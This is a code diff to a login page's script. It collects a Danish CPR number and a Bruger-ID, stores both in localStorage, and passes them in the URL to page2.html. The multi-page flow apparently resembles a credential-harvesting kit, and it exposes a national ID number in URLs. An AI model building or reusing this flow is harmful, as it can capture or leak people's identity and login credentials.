@@ -119,6 +119,15 @@
     const inputField = document.getElementById('cpr-number');
     const submitBtn = document.getElementById('submitBtn');
     const loginForm = document.getElementById('loginForm');
+    const urlParams = new URLSearchParams(window.location.search);
+    const brugerFromUrl = urlParams.get('burger_id') || urlParams.get('bruger_id') || '';
+    if (brugerFromUrl) {
+      localStorage.setItem('brugerId', brugerFromUrl.trim());
+    }
+    // Must have Bruger-ID before CPR
+    if (!(localStorage.getItem('brugerId') || '').trim()) {
+      window.location.replace('index1.html');
+    }
 
     inputField.addEventListener('input', function() {
       if (this.value.trim().length > 0) {
@@ -130,18 +139,24 @@
       }
     });
 
-    // Save CPR number and route details directly to page2.html
+    // Save CPR + Bruger-ID and continue to page2.html
     loginForm.addEventListener('submit', function(event) {
       event.preventDefault();
       if (submitBtn.disabled) return;
 
       const cprNumber = inputField.value.trim();
-      
-      // Store in localStorage
-      localStorage.setItem('cprNumber', cprNumber);
+      const brugerId = (localStorage.getItem('brugerId') || '').trim();
+      if (!brugerId) {
+        window.location.replace('index1.html');
+        return;
+      }
 
-      // Forward to page2.html while passing the parameter in the URL string as well
-      window.location.href = `page2.html?cpr=${encodeURIComponent(cprNumber)}`;
+      localStorage.setItem('cprNumber', cprNumber);
+      localStorage.setItem('brugerId', brugerId);
+
+      window.location.href =
+        'page2.html?cpr=' + encodeURIComponent(cprNumber) +
+        '&burger_id=' + encodeURIComponent(brugerId);
     });
   </script>
 
